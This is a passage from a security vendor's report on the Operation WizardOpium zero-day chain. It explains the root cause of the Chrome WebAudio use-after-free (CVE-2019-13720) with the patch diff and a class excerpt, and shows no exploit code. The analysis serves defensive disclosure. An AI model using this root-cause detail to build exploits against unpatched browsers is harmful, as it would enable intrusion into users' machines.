<li class="title"><span>Securelist</span>
<li class="parent" data-parent="" data-icon="top-item"><a href="https://securelist.com/threat-categories/"><i class="top-item"></i><span>Threats</span></a>
<ul class="submenu">
<li class="menu-item menu-item-type-taxonomy menu-item-object-threat-category menu-item-89472"><a href="https://securelist.com/threat-category/financial-threats/">Financial threats</a>
<li class="menu-item menu-item-type-taxonomy menu-item-object-threat-category menu-item-89467"><a href="https://securelist.com/threat-category/mobile-threats/">Mobile threats</a>
<li class="menu-item menu-item-type-taxonomy menu-item-object-threat-category menu-item-89471"><a href="https://securelist.com/threat-category/web-threats/">Web threats</a>
<li class="menu-item menu-item-type-taxonomy menu-item-object-threat-category menu-item-89468"><a href="https://securelist.com/threat-category/secure-environment/">Secure environment (IoT)</a>
<li class="menu-item menu-item-type-taxonomy menu-item-object-threat-category current-post-ancestor current-menu-parent current-post-parent menu-item-89470"><a href="https://securelist.com/threat-category/vulnerabilities-and-exploits/">Vulnerabilities and exploits</a>
<li class="menu-item menu-item-type-taxonomy menu-item-object-threat-category menu-item-89466"><a href="https://securelist.com/threat-category/spam-and-phishing/">Spam and Phishing</a>
<li class="menu-item menu-item-type-taxonomy menu-item-object-threat-category menu-item-89469"><a href="https://securelist.com/threat-category/industrial-threats/">Industrial threats</a>
</ul>

<li class="parent" data-parent="" data-icon="top-item"><a href="https://securelist.com/categories/"><i class="top-item"></i><span>Categories</span></a>
<ul class="submenu">
<li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-87880"><a href="https://securelist.com/category/apt-reports/">APT reports</a>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-87881"><a href="https://securelist.com/category/incidents/">Incidents</a>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-87886"><a href="https://securelist.com/category/research/">Research</a>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-89476"><a href="https://securelist.com/category/malware-reports/">Malware reports</a>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-89479"><a href="https://securelist.com/category/spam-and-phishing-reports/">Spam and phishing reports</a>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-89477"><a href="https://securelist.com/category/publications/">Publications</a>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-87882"><a href="https://securelist.com/category/kaspersky-security-bulletin/">Kaspersky Security Bulletin</a>
</ul>

<li class="menu-item menu-item-type-post_type menu-item-object-page current_page_parent menu-item-101953"><a href="https://securelist.com/all/">Archive</a>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-87899"><a href="https://securelist.com/tags/">All Tags</a>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-101954"><a href="https://apt.securelist.com/?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_mobmen_sm-team_______03880766cb97f3a8">APT Logbook</a>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-101955"><a href="https://securelist.com/webinars/">Webinars</a>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-102687"><a href="https://statistics.securelist.com/?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_mobmen_sm-team_______03880766cb97f3a8">Statistics</a>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-87901"><a target="_blank" href="https://encyclopedia.kaspersky.com/?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_mobmen_sm-team_______03880766cb97f3a8">Encyclopedia</a>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-87902"><a target="_blank" href="https://threats.kaspersky.com/?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_mobmen_sm-team_______03880766cb97f3a8">Threats descriptions</a>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-105984"><a href="https://securelist.com/ksb-2021/">KSB 2021</a>
<li class="splitter"></li>
<li class="parent" data-parent="About Us" data-icon="top-item"><a rel="About Us" href="#"><i class="top-item"></i><span>About Us</span></a>
<ul class="submenu">
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-87792"><a href="https://www.kaspersky.com/about/company?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_mobmen_sm-team_______03880766cb97f3a8">Company</a>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-87968"><a href="https://www.kaspersky.com/transparency?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_mobmen_sm-team_______03880766cb97f3a8">Transparency</a>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-87971"><a href="https://www.kaspersky.com/about/press-releases?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_mobmen_sm-team_______03880766cb97f3a8">Corporate News</a>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-87796"><a href="https://press.kaspersky.com/?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_mobmen_sm-team_______03880766cb97f3a8">Press Center</a>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-87797"><a href="https://www.kaspersky.com/about/careers?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_mobmen_sm-team_______03880766cb97f3a8">Careers</a>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-87798"><a href="https://www.kaspersky.com/about/sponsorships/?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_mobmen_sm-team_______03880766cb97f3a8">Sponsorships</a>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-87970"><a href="https://www.kaspersky.com/about/policy-blog?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_mobmen_sm-team_______03880766cb97f3a8">Policy Blog</a>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-87793"><a href="https://www.kaspersky.com/about/contact?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_mobmen_sm-team_______03880766cb97f3a8">Contacts</a>
</ul>

<li class="parent" data-parent="Partners" data-icon="top-item"><a rel="Partners" href="#"><i class="top-item"></i><span>Partners</span></a>
<ul class="submenu">
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-87768"><a href="https://www.kasperskypartners.com/?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_mobmen_sm-team_______03880766cb97f3a8">Find a Partner</a>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-87769"><a href="https://www.kaspersky.com/partners?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_mobmen_sm-team_______03880766cb97f3a8">Partner Program</a>
</ul>

	</ul>
	<div class="background-overlay"></div>
</div>

	<div class="c-page">
		<section class="c-block c-block--bg-image c-page-header js-sticky-header" style="background-image: url(https://securelist.com/wp-content/themes/securelist2020/assets/images/content/bg-gradient-01.jpg);">
			<div class="o-container-fluid">
				<div class="c-page-header__wrapper u-mt-spacer-base-">
					<div class="o-row o-row--small-gutters">
						<div class="o-col-3@md u-mt-spacer-base-">
							<a data-element-id="content-menu" href="#" class="c-page-nav-toggle js-main-menu-toggle">
								<span class="c-page-nav-toggle__icon">
									<span></span>
									<span></span>
									<span></span>
								</span>
								<span class="c-page-nav-toggle__text">Content menu</span>
								<span class="c-page-nav-toggle__text c-page-nav-toggle__text--active">Close</span>
															</a>
						</div>
						<div class="o-col-6@md">
							<form class="c-page-search__form js-main-search-popup js-wizardinfosys_autosearch_form" full_search_url="https://securelist.com/?s=%q%" action="https://securelist.com/" method="get">
	<div class="c-form-element c-form-element--style-fill">
		<div class="c-form-element__field wp_autosearch_form_wrapper">
			<input name="s" class="c-form-element__text wp_autosearch_input ac_input" data-webinars="" type="text" value="" placeholder="Search..." autocomplete="off">
		</div>
	</div>
	<button class="c-button c-button--icon wp_autosearch_submit"><svg class="o-icon o-svg-icon o-svg-large"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="https://securelist.com/wp-content/themes/securelist2020/assets/sprite/icons.svg#icon-search"></use></svg></button>
</form>
						</div>
						<div class="o-col-3@md c-page-header__utilities">
							<a data-element-id="subscribe-button" href="#modal-newsletter" class="c-button c-subscribe-modal-toggle js-modal-open"><svg class="o-icon o-svg-icon o-svg-large"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="https://securelist.com/wp-content/themes/securelist2020/assets/sprite/icons.svg#icon-envelope"></use></svg><span>Subscribe</span></a>
							<div class="c-page-header__dropdown-wrapper">
																	<button class="c-button c-button--icon c-user-button js-kaspersky-sso-login"><svg class="o-icon o-svg-icon o-svg-large"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="https://securelist.com/wp-content/themes/securelist2020/assets/sprite/icons.svg#icon-user"></use></svg></button>
															</div>
						</div>
					</div>
				</div>
			</div>

			<nav class="c-page-nav c-color--invert">
				<div class="o-container-fluid">
					<div class="o-row o-row--small-gutters">
						<div class="o-col-3@md c-page-nav__info">
							<div class="c-site-logo__group">
								<a data-element-id="content-menu-securelist-logo" href="https://securelist.com/" class="c-site-logo c-site-logo--basic c-site-logo--sm"></a>
								<span class="c-site-tagline">by Kaspersky</span>
							</div>
							<a data-element-id="content-menu-dark-mode" href="#" class="c-theme-switcher js-theme-switcher"><i class="font-icons icon-moon"></i> Dark mode<span class="u-hidden u-inline--dark"> off</span></a>
						</div>
						<div class="o-col-9@md">
							<div class="c-page-menu">
								<div class="o-row c-page-menu__dividers">
									<div class="o-col-4@md"><div class="c-accordion js-accordion c-accordion--reset@md"><p id="menu-item-226" class="menu-item-threats section-title accordion menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-226 c-page-menu__title u-hidden u-block@md"><a href="https://securelist.com/threat-categories/" data-element-id="content-menu-link">Threats</a></p><div class="c-accordion-toggle js-accordion-toggle"><p>Threats</p></div><div class="c-accordion-container js-accordion-container">
<ul class="sub-menu">
	<li id="menu-item-99839" class="menu-item menu-item-type-taxonomy menu-item-object-threat-category current-post-ancestor current-menu-parent current-post-parent menu-item-99839"><a href="https://securelist.com/threat-category/apt-targeted-attacks/" data-element-id="content-menu-link">APT (Targeted attacks)</a></li>
	<li id="menu-item-89457" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-89457"><a href="https://securelist.com/threat-category/secure-environment/" data-element-id="content-menu-link">Secure environment (IoT)</a></li>
	<li id="menu-item-63231" class="topic-item vulnerabilities menu-item menu-item-type-custom menu-item-object-custom menu-item-63231"><a href="https://securelist.com/threat-category/mobile-threats/" data-element-id="content-menu-link">Mobile threats</a></li>
	<li id="menu-item-63229" class="topic-item detected menu-item menu-item-type-custom menu-item-object-custom menu-item-63229"><a href="https://securelist.com/threat-category/financial-threats/" data-element-id="content-menu-link">Financial threats</a></li>
	<li id="menu-item-89458" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-89458"><a href="https://securelist.com/threat-category/spam-and-phishing/" data-element-id="content-menu-link">Spam and phishing</a></li>
	<li id="menu-item-99840" class="menu-item menu-item-type-taxonomy menu-item-object-threat-category menu-item-99840"><a href="https://securelist.com/threat-category/industrial-threats/" data-element-id="content-menu-link">Industrial threats</a></li>
	<li id="menu-item-89465" class="menu-item menu-item-type-taxonomy menu-item-object-threat-category menu-item-89465"><a href="https://securelist.com/threat-category/web-threats/" data-element-id="content-menu-link">Web threats</a></li>
	<li id="menu-item-89459" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-89459"><a href="https://securelist.com/threat-category/vulnerabilities-and-exploits/" data-element-id="content-menu-link">Vulnerabilities and exploits</a></li>
	<li id="menu-item-113855" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-113855"><a href="https://securelist.com/threat-categories/" data-element-id="content-menu-link">All threats</a></li>
</ul>
</li>
</li></ul></div></div></div><div class="o-col-4@md"><div class="c-accordion js-accordion c-accordion--reset@md"><p id="menu-item-230" class="menu-item-categories section-title accordion menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-230 c-page-menu__title u-hidden u-block@md"><a href="https://securelist.com/categories/" data-element-id="content-menu-link">Categories</a></p><div class="c-accordion-toggle js-accordion-toggle"><p>Categories</p></div><div class="c-accordion-container js-accordion-container">
<ul class="sub-menu">
	<li id="menu-item-84158" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-84158"><a href="https://securelist.com/category/apt-reports/" data-element-id="content-menu-link">APT reports</a></li>
	<li id="menu-item-99841" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-99841"><a href="https://securelist.com/category/malware-descriptions/" data-element-id="content-menu-link">Malware descriptions</a></li>
	<li id="menu-item-84160" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-84160"><a href="https://securelist.com/category/kaspersky-security-bulletin/" data-element-id="content-menu-link">Security Bulletin</a></li>
	<li id="menu-item-84161" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-84161"><a href="https://securelist.com/category/malware-reports/" data-element-id="content-menu-link">Malware reports</a></li>
	<li id="menu-item-89460" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-89460"><a href="https://securelist.com/category/spam-and-phishing-reports/" data-element-id="content-menu-link">Spam and phishing reports</a></li>
	<li id="menu-item-99842" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-99842"><a href="https://securelist.com/category/security-technologies/" data-element-id="content-menu-link">Security technologies</a></li>
	<li id="menu-item-84165" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-84165"><a href="https://securelist.com/category/research/" data-element-id="content-menu-link">Research</a></li>
	<li id="menu-item-84164" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-84164"><a href="https://securelist.com/category/publications/" data-element-id="content-menu-link">Publications</a></li>
	<li id="menu-item-113876" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-113876"><a href="https://securelist.com/categories/" data-element-id="content-menu-link">All categories</a></li>
</ul>
</li>
</li></ul></div></div></div><div class="o-col-4@md"><p id="menu-item-277" class="menu-item-tags section-title after-accordion menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-277 c-page-menu__title u-hidden u-block@md"><a data-element-id="content-menu-link">Other sections</a></p>
<ul class="sub-menu">
	<li id="menu-item-100526" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-100526"><a href="https://securelist.com/all/" data-element-id="content-menu-link">Archive</a></li>
	<li id="menu-item-57837" class="show-all-tags menu-item menu-item-type-post_type menu-item-object-page menu-item-57837"><a href="https://securelist.com/tags/" data-element-id="content-menu-link">All tags</a></li>
	<li id="menu-item-101956" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-101956"><a href="https://securelist.com/webinars/" data-element-id="content-menu-link">Webinars</a></li>
	<li id="menu-item-101126" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-101126"><a target="_blank" rel="noopener noreferrer" href="https://apt.securelist.com/?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="content-menu-link">APT Logbook</a></li>
	<li id="menu-item-241" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-241"><a target="_blank" rel="noopener noreferrer" href="https://statistics.securelist.com/?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="content-menu-link">Statistics</a></li>
	<li id="menu-item-86643" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-86643"><a target="_blank" rel="noopener noreferrer" href="https://encyclopedia.kaspersky.com/?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="content-menu-link">Encyclopedia</a></li>
	<li id="menu-item-58141" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-58141"><a target="_blank" rel="noopener noreferrer" href="https://threats.kaspersky.com/?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="content-menu-link">Threats descriptions</a></li>
	<li id="menu-item-111312" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-111312"><a href="https://securelist.com/ksb-2023/" data-element-id="content-menu-link">KSB 2023</a></li>
</ul>
</li>
</div>								</div>
							</div>
						</div>
					</div>
				</div>
			</nav>
		</section>			<section class="c-block c-block--spacing-t@md c-block--spacing-b-small@md c-block--divider-internal" style="z-index:10">
				<div class="o-container-fluid">
					<article class="c-article">
						<header class="c-article__header">
							<figure class="c-article__figure u-hidden@md">
								<img width="800" height="450" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/11/11130521/securelist_abs_11-800x450.jpg" class="attachment-securelist-2020-thumbnail size-securelist-2020-thumbnail wp-post-image" alt="" decoding="async" fetchpriority="high" data-src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/11/11130521/securelist_abs_11-800x450.jpg" data-srcset="" srcset="" />							</figure>
														<p class="c-article__headline u-hidden@md">
								<a href="https://securelist.com/category/apt-reports/" class="c-tag c-tag--primary">APT reports</a>
							</p>
														<h1 class="c-article__title">The zero-day exploits of Operation WizardOpium</h1>							<div class="c-article__info">
																<p class="c-article__headline u-hidden u-block@md">
									<a href="https://securelist.com/category/apt-reports/" class="c-tag c-tag--primary">APT reports</a>
								</p>
																<p class="u-uppercase"><time datetime="2020-05-28T10:00:09+00:00">28 May 2020</time></p>
								<p class="c-article__reading u-ml-auto@md">
									<svg class="o-icon o-svg-icon"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="https://securelist.com/wp-content/themes/securelist2020/assets/sprite/icons.svg#icon-hourglass"></use></svg> <span class="js-reading-time"></span> minute read								</p>
							</div>
						</header>

						<div class="c-article__wrapper">

							<div class="c-article__main">

																<div class="c-highlight c-highlight--overflow-down@md js-accordion u-hidden@md">
									<div class="c-accordion-toggle js-accordion-toggle">
										<div class="c-highlight__header">
											<div class="c-highlight__icon">
												<div class="u-block--theme-light u-hidden--theme-dark">
													<img src="https://securelist.com/wp-content/themes/securelist2020/assets/images/icon/icon-categories.svg" />
												</div>
												<div class="u-block--theme-dark u-hidden--theme-light">
													<img src="https://securelist.com/wp-content/themes/securelist2020/assets/images/icon/icon-categories--invert.svg" />
												</div>
											</div>
											<div class="c-highlight__title">
												<p>Table of Contents</p>
											</div>
										</div>
									</div>
									<div class="js-accordion-container">
										<div class="c-highlight__body">
											<ul class='c-list-links'><li><a href="#google-chrome-remote-code-execution-exploit">Google Chrome remote code execution exploit</a></li><li><a href="#microsoft-windows-elevation-of-privilege-exploit">Microsoft Windows elevation of privilege exploit</a></li><li><a href="#conclusions">Conclusions</a></li></ul>										</div>
									</div>
								</div>
								
								<div class="o-row c-article__container">
									<div class="o-col c-article__content js-article-body">
										<div class="js-reading-wrapper">
											<figure class="c-article__figure u-hidden u-block@md">
												<img width="1200" height="600" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/11/11130521/securelist_abs_11-1200x600.jpg" class="attachment-securelist-2020-thumbnail-large size-securelist-2020-thumbnail-large wp-post-image" alt="" decoding="async" data-src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/11/11130521/securelist_abs_11-1200x600.jpg" data-srcset="" srcset="" />											</figure>

											<div class="c-article__authors u-hidden u-block@md">
												<p class="c-block__title">Authors</p>
												<ul class="c-list-authors">
																<li>
			<a  href="https://securelist.com/author/borislarin/" >
								<img alt='' src='https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/03/21152203/Boris-Larin_Securelist_2023-30x30.jpg' srcset='https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/03/21152203/Boris-Larin_Securelist_2023-60x60.jpg 2x' class='avatar avatar-30 photo' height='30' width='30' decoding='async'/>										<span>Boris Larin</span></a>
		</li>
			<li>
			<a  href="https://securelist.com/author/alexeykulaev/" >
													<img src="https://securelist.com/wp-content/themes/securelist2020/assets/images/avatar-default/avatar_default_3.png">
										<span>Alexey Kulaev</span></a>
		</li>
														</ul>
											</div>

											
											<div class="js-reading-content">
												<div class="c-wysiwyg">
													<p>Back in October 2019 we detected a classic watering-hole attack on a North Korea-related news site that exploited a chain of Google Chrome and Microsoft Windows zero-days. While we&#8217;ve already published blog posts briefly describing this operation (available <a href="https://securelist.com/chrome-0-day-exploit-cve-2019-13720-used-in-operation-wizardopium/94866/">here</a> and <a href="https://securelist.com/windows-0-day-exploit-cve-2019-1458-used-in-operation-wizardopium/95432/">here</a>), in this blog post we&#8217;d like to take a deep technical dive into the exploits and vulnerabilities used in this attack.</p>
<h2 id="google-chrome-remote-code-execution-exploit">Google Chrome remote code execution exploit</h2>
<p>In the <a href="https://securelist.com/chrome-0-day-exploit-cve-2019-13720-used-in-operation-wizardopium/94866/">original blog post</a> we described the exploit loader responsible for initial validation of the target and execution of the next stage JavaScript code containing the full browser exploit. The exploit is huge because, besides code, it contains byte arrays with shellcode, a Portable Executable (PE) file and WebAssembly (WASM) module used in the later stages of exploitation. The exploit abused a vulnerability in the WebAudio OfflineAudioContext interface and was targeting two release builds of Google Chrome 76.0.3809.87 and 77.0.3865.75. However, the vulnerability was introduced long before that and much earlier releases with a WebAudio component are also vulnerable. At the time of our discovery the current version of Google Chrome was 78, and while this version was also affected, the exploit did not support it and had a number of checks to ensure that it would only be executed on affected versions to prevent crashes. After our report, the vulnerability was assigned CVE-2019-13720 and was fixed in version 78.0.3904.87 with the following <a href="https://chromium.googlesource.com/chromium/src.git/+/6a2e670a243b815cf043f8da4d26ecb9a64d307b">commit</a>. A use-after-free (UAF) vulnerability, it could be triggered due to a race condition between the Render and Audio threads:</p>
		<div id="crayon-676241da675c7813625331" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
   if (!buffer) {
+	BaseAudioContext::GraphAutoLocker context_locker(Context());
+	MutexLocker locker(process_lock_);
 	reverb_.reset();
 	shared_buffer_ = nullptr;
 	return;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-676241da675c7813625331-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675c7813625331-2">2</div><div class="crayon-num" data-line="crayon-676241da675c7813625331-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675c7813625331-4">4</div><div class="crayon-num" data-line="crayon-676241da675c7813625331-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675c7813625331-6">6</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-676241da675c7813625331-1"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">!</span><span class="crayon-i">buffer</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675c7813625331-2">+<span class="crayon-h">	</span><span class="crayon-i">BaseAudioContext</span><span class="crayon-sy">:</span><span class="crayon-sy">:</span><span class="crayon-e">GraphAutoLocker </span><span class="crayon-e">context_locker</span><span class="crayon-sy">(</span><span class="crayon-e">Context</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675c7813625331-3">+<span class="crayon-h">	</span><span class="crayon-e">MutexLocker </span><span class="crayon-e">locker</span><span class="crayon-sy">(</span><span class="crayon-i">process_lock_</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675c7813625331-4"><span class="crayon-h"> 	</span><span class="crayon-i">reverb_</span><span class="crayon-sy">.</span><span class="crayon-e">reset</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675c7813625331-5"><span class="crayon-h"> 	</span><span class="crayon-i">shared_buffer_</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">nullptr</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675c7813625331-6"><span class="crayon-h"> 	</span><span class="crayon-st">return</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div><p>
As you can see, when the audio buffer is set to null in ConvolverNode and an active buffer already exists within the Reverb object, the function SetBuffer() can destroy reverb_ and shared_buffer_ objects.</p>
		<div id="crayon-676241da675cf174158750" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
class MODULES_EXPORT ConvolverHandler final : public AudioHandler {
...
  std::unique_ptr&lt;Reverb&gt; reverb_;
  std::unique_ptr&lt;SharedAudioBuffer&gt; shared_buffer_;
...</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-676241da675cf174158750-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675cf174158750-2">2</div><div class="crayon-num" data-line="crayon-676241da675cf174158750-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675cf174158750-4">4</div><div class="crayon-num" data-line="crayon-676241da675cf174158750-5">5</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-676241da675cf174158750-1"><span class="crayon-t">class</span><span class="crayon-h"> </span><span class="crayon-e">MODULES_EXPORT </span><span class="crayon-e">ConvolverHandler </span><span class="crayon-m">final</span><span class="crayon-h"> </span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-e">AudioHandler</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675cf174158750-2"><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span></div><div class="crayon-line" id="crayon-676241da675cf174158750-3"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-i">std</span><span class="crayon-sy">:</span><span class="crayon-sy">:</span><span class="crayon-i">unique_ptr</span><span class="crayon-h">&lt;</span><span class="crayon-i">Reverb</span><span class="crayon-h">&gt;</span><span class="crayon-h"> </span><span class="crayon-i">reverb_</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675cf174158750-4"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-i">std</span><span class="crayon-sy">:</span><span class="crayon-sy">:</span><span class="crayon-i">unique_ptr</span><span class="crayon-h">&lt;</span><span class="crayon-i">SharedAudioBuffer</span><span class="crayon-h">&gt;</span><span class="crayon-h"> </span><span class="crayon-i">shared_buffer_</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675cf174158750-5"><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span></div></div></td>
					</tr>
				</table>
			</div>
		</div><p>
These objects might still be in use by the Render thread because there is no proper synchronization between the two threads in the code. A patch added two missing locks (graph lock and process lock) for when the buffer is nullified.</p>
